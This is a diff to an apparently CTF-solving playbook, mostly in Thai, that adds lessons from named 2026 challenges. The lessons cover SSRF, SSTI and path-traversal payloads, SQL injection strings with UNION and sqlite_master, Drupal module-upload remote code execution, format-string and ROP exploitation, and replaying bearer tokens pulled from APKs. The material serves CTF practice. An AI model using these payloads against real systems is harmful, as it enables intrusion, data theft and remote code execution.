@@ -357,6 +357,8 @@ Full toolbox: read `references/TOOLS.md`. Below is the 1-line essence per catego
 - SSRF preview (2026): `/fetch?url=http://127.0.0.1/flag` ได้ `cspp{...}` ทันที ถ้าเจอ `internal service: try /flag` คือมาถูกทางแล้ว
 - SSTI render (2026): `POST {"name":"{{7*7}}"}` -> `Hello, 49!` ยืนยันได้ แล้ว `{{config}}` / `{{flag}}` คาย `cspp{...}` ทันที ไม่ต้อง chain `__class__` (โดนกรองว่าง)
 - Traversal file API (2026): `GET /file?name=../secret/flag.txt` ใช้ `../` ดิบๆ ได้ `cspp{...}` ห้าม encode `%2F`
+- Legacy release lesson (2026, Legacy Intake): current API ตอบ `410` พร้อม `"this bearer is for release 2023-11"` -> route เก่ามักยัง mount อยู่ ให้ลอง `/api/<release>/<action>` (เช่น `/api/2023-11/intake`); `GET` ตอบ `401` = route มีจริง, `404` = ไม่มี; replay `POST` พร้อม header/body จาก support card/APK -> `200` + ชี้ desk ต่อไป
+- SQLi error page lesson (2026, Legacy Intake): `q='` ทำให้ `500` และหน้า error เผย query จริง `SELECT label FROM notes WHERE label = '<q>' AND owner = 'alice'` -> ใช้ `' OR '1'='1` หลุด filter owner, เติม `-- -` ตัด `AND owner=...`; query 1 column -> `UNION SELECT note FROM notes -- -`; fingerprint `sqlite_version()`, schema จาก `sqlite_master`; ถ้า owner filter ซ่อน row ของ owner อื่น ให้ comment ทิ้งก่อน
 - Drupal admin -> RCE (2026): Drupal 8.5.3 + `admin:password` -> `/admin/modules/install` อัปโหลดโมดูล `.tar.gz` ที่เขียนเอง (`info.yml` + `routing.yml` + Controller รัน `shell_exec`) -> แตกไป `/modules/<mod>` -> enable ที่ `/admin/modules` -> `GET /<mod>?c=id` ได้ `uid=33(www-data)`; flag อยู่ `/var/www/html/flag_<random>.txt` (`start.sh` สุ่มชื่อด้วย `sha256sum|base64|head -c5`) ใช้ `python tools/drupal_admin_rce.py --url ... --user ... --pass ... --cmd id` — ระวัง wrapper ของ flag แต่ละเวทีไม่ใช่ `cspp{}` เสมอ (ข้อนี้เป็น `pg{...}`) ให้ใช้ค่าดิบจากไฟล์ ห้ามเดา prefix
 - Drupalgeddon2 (CVE-2018-7600) บน 8.5.3: POST `/user/register?element_parents=account/mail/%23value&_wrapper_format=drupal_ajax` คืน 200 แต่ได้แค่ HTML ฟอร์ม ไม่มี output `id` = ไม่ exec → ถ้ามี admin cred ให้ไปทาง module upload ก่อน อย่าเสียเวลา
 - Cache trap: route ที่เพิ่งสร้างอาจถูก internal page cache ของ anonymous แคช → ได้ output ซ้ำของคำสั่งเก่า; แก้ด้วยการยิงด้วย cookie admin, ใส่ cache-buster `&x=random`, และใส่ `'#cache' => ['max-age' => 0]` ใน render array
@@ -401,6 +403,7 @@ Full toolbox: read `references/TOOLS.md`. Below is the 1-line essence per catego
 - Common: ret2win, ret2libc, ROP, format string (`%x.%x`), heap UAF, SROP.
 - Tools: `pwntools`, `gef/pwndbg`, `ROPgadget`, `one_gadget`.
 - Windows: ELF รันตรงไม่ได้ -> ใช้ WSL/Docker; static parse ด้วย `elftools` ก่อน.
+- Buffy Vampire#3 lesson (2026): `INSPECT` เป็น format string (`printf(buf)`) leak canary ที่ `%13$p`, return address `main+0x1e64` ที่ `%15$p` -> PIE base; `READAT <addr>` เป็น arbitrary read 48 bytes (ใช้ leak `g_token`); `ARCHIVE` buffer 72 bytes แต่ `read` ถึง 256 -> overflow + ROP ไป `emit_record` (ต้องมี `ret` gadget เพื่อ align stack); `STASH` วาง path `/var/vault/<seal>/record.dat`; seccomp allowlist ไม่กัน format string/ROP เพราะไม่ต้อง execve.
 - Flow: Found `No PIE + gets() + win() at 0x4011xx` / Means ret2win ตรงๆ / Next offset ด้วย cyclic แล้ว `python -c 'b"A"*offset + p64(win)' | ./pwn`.
 
 ### 6. Miscellaneous / Misc
@@ -415,6 +418,10 @@ Full toolbox: read `references/TOOLS.md`. Below is the 1-line essence per catego
 - Recon: `file APK`, SHA verify, `aab/apk?`, `dex/so/flutter?` — `lib/*/libapp.so` + `blutter` = Flutter, `classes.dex` บาง = wrapper.
 - Tools Windows: `jadx`, `apktool`, `blutter/reFlutter`, `repak`, `adb`, `frida/objection`, `python plyvel`, `strings.py`.
 - Check: manifest permissions, exported components, hardcoded keys, `shared_preferences`/HMAC, native libs, network config.
+- APK archived-request lesson (2026, Legacy Intake): `classes.dex` เล็ก + `assets/support/capture.txt`; `Scenario.configure()` ฮาร์ดโค้ด `Authorization: Bearer ...`, `X-Device`, `X-Lane-Version` และ `Scenario.path()` = `/api/v2/intake`; build constant `c02/c03/c04` เลือก path/body ต่างกัน -> อย่าดูแค่ strings ให้ dump bytecode `MainActivity`/`Scenario`; ใช้ `androguard` เมื่อ `jadx` ค้าง
+- Mobile -> Web chain lesson (2026, Legacy Intake): APK/support card เก็บ request เก่า -> replay กับ legacy release endpoint -> desk/search -> SQLi; อย่าหยุดที่การแกะ APK ให้ต่อ request ที่แกะได้เข้าระบบจริง
+- Hollow Post / Candy Vault lesson (2026): `hearth.seed` ใน `assets/hearth.properties` -> XOR 0x5A ต่อ byte = `X-Hearth-Key`; `GET /api/v1/hearth/open` ตอบ `nonce` + ตั้ง Flask session `hollow_c05` (`porch_nonce`); `POST /api/v1/hearth/turn` รับ turn ทาง header `X-Hearth-Turn` เท่านั้น (JSON/form body ถูกเมิน) และเทียบกับ `sha256(nonce + ":" + X-Hearth-Key)[:16]` — สลับ arg จาก `Scenario.turn(seed, arg)` ใน APK; ถ้า 403 ให้ลอง header/body และสลับ arg ก่อนสรุปว่าต้องมี secret อื่น
+- Slate/record chain lesson (2026, Candy Vault): หลัง porch เปิด `GET /vault/board` ได้ manifest; เปิด record ทุกอัน (`/vault/run/C-31`) เพื่อหา link ที่ซ่อน เช่น `/vault/slate/<id>` ซึ่งมี `<dd class="seal">` เป็น flag; อย่าหยุดที่ board
 - Flow: `Found: Flutter APK + DPK2 assets` / `Means: ต้อง blutter + dynamic` / `Next: emulator+frida hook logic/collect`.
 
 ---
